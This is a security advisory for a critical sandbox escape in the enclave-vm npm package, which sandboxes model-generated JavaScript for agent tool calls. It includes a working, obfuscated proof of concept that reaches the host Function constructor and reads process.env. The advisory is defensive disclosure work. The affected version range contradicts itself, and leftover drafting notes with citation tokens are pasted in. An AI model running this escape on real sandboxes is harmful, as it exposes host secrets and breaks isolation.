# [C] enclave-vm Vulnerable to Sandbox Escape via Host Error Prototype Chain

## Summary
Severity: Critical
Advisory: GHSA-7qm7-455j-5p63
CVE: CVE-2026-22686
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-14
Source: https://github.com/advisories/GHSA-7qm7-455j-5p63
Type: github-advisory

## Affected
- npm: `enclave-vm` — affected >=0 <2.7.0

## Details
A critical sandbox escape vulnerability exists in **enclave-vm** (affected: **< 2.6.0**, patched: **2.7.0**) that can allow untrusted, sandboxed JavaScript to execute arbitrary code in the **host Node.js runtime**.

When a tool invocation fails, enclave-vm exposes a **host-side Error object** to sandboxed code. This Error object retains its **host realm prototype chain**, which can be traversed to reach the **host `Function` constructor**:

`Error instance → Error.prototype → Error constructor → Function constructor`

With access to the host `Function` constructor, an attacker can compile and execute arbitrary JavaScript in the host context — bypassing the sandbox boundary and potentially gaining access to sensitive resources such as `process.env`, filesystem, and network.

This breaks enclave-vm’s core security guarantee of isolating untrusted code.

---

### Ecosystem Impact (FrontMCP / CodeCall)

**FrontMCP** is a TypeScript-first framework for building MCP servers, and the **CodeCall plugin** enables models to orchestrate large toolsets by generating and executing JavaScript plans.

**Enclave is the defense-in-depth sandbox layer behind CodeCall** (AST validation + runtime sandboxing). If you use FrontMCP **CodeCall** for agent tool execution, you should treat this as an urgent upgrade and ensure your runtime is on a patched enclave-vm version.

---

### Live Playground (Safe Exploration & Testing)

To explore Enclave’s execution model (AgentScript + tool calls) and validate your integration behavior, use the live playground:

- **EnclaveVM Playground:** https://enclave.agentfront.dev

This is the quickest way to understand the sandbox / tool-call flow and confirm your environment is running a patched setup.

---

### Timeline (Fast Fix)

- **Fix released:** `enclave-vm@2.7.0` (Jan 9, 2026)
- **Advisory published:** Jan 13, 2026

---

### Proof of Concept

> ⚠️ For defensive validation and maintainers. Do not run PoCs on hosts you don’t own/control.

<details>
<summary>Click to expand PoC</summary>

```javascript
// Vector 35: The Host Error Escape
// Purpose: Trigger a Host-side error and traverse its prototype chain
// to reach the Host Function constructor.

const s = (...args) => String.fromCharCode(...args);

const kCon    = s(99,111,110,115,116,114,117,99,116,111,114); // "constructor"
const kProto  = s(95,95,112,114,111,116,111,95,95);           // "__proto__"
const kLookup = s(95,95,108,111,111,107,117,112,71,101,116,116,101,114,95,95);
const kCode   = s(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,101,110,118);
const kPtype  = s(112,114,111,116,111,116,121,112,101);

try {
    const ObjectProto = Object[kPtype];
    const lookup = ObjectProto[kLookup];
    const getProtoNative = lookup.call(ObjectProto, kProto);

    let hostError;
    try {
        await callTool('THIS_TOOL_DOES_NOT_EXIST_XYZ', {});
    } catch (e) {
        hostError = e;
    }

    const errProto = getProtoNative.call(hostError);
    const ErrorCtor = errProto[kCon];
    const HostFunc = ErrorCtor[kCon];

    const exploitFn = HostFunc(kCode);
    return exploitFn();
} catch (e) {
    return e.message;
}
````

</details>

---

### Mitigation / Remediation

**Immediate action:**

* Upgrade **enclave-vm** to **2.7.0+**

**Defense-in-depth guidance:**

* Re-create all Error objects crossing the sandbox boundary **inside the sandbox realm**
* Strip / freeze prototype chains of host objects
* Prevent access to host `Function` constructors
* Harden tool error handling to avoid leaking host-native objects

---

### References

* GitHub Security Advisory: [https://github.com/agentfront/enclave/security/advisories/GHSA-7qm7-455j-5p63](https://github.com/agentfront/enclave/security/advisories/GHSA-7qm7-455j-5p63)
* npm package: [https://www.npmjs.com/package/enclave-vm](https://www.npmjs.com/package/enclave-vm)
* Enclave repo: [https://github.com/agentfront/enclave](https://github.com/agentfront/enclave)
* FrontMCP docs: [https://agentfront.dev/docs](https://agentfront.dev/docs)
* CodeCall plugin overview: [https://agentfront.dev/docs/plugins/overview](https://agentfront.dev/docs/plugins/overview)
* EnclaveVM Playground: [https://enclave.agentfront.dev/](https://enclave.agentfront.dev)

```

Factual hooks (for correctness):
- GHSA page confirms **affected `<2.6.0`** and **patched `2.7.0`**, plus CVSS 10.0 and the exact vulnerability description. :contentReference[oaicite:0]{index=0}  
- FrontMCP docs explicitly describe **CodeCall** and that it uses **Enclave (AST validation + runtime sandboxing)**. :contentReference[oaicite:1]{index=1}  
- FrontMCP positioning (“TypeScript-first framework for MCP…”) is stated in the docs. :contentReference[oaicite:2]{index=2}  
- Enclave repo links the **Live Demo** at `enclave.agentfront.dev`. :contentReference[oaicite:3]{index=3}  
- Release listing shows `enclave-vm@2.7.0` dated **Jan 9** (fast fix signal). :contentReference[oaicite:4]{index=4}
::contentReference[oaicite:5]{index=5}

## References
- https://github.com/agentfront/enclave/security/advisories/GHSA-7qm7-455j-5p63
- https://nvd.nist.gov/vuln/detail/CVE-2026-22686
- https://github.com/agentfront/enclave/commit/ed8bc438b2cd6e6f0b5f2de321e5be6f0169b5a1
- https://github.com/agentfront/enclave
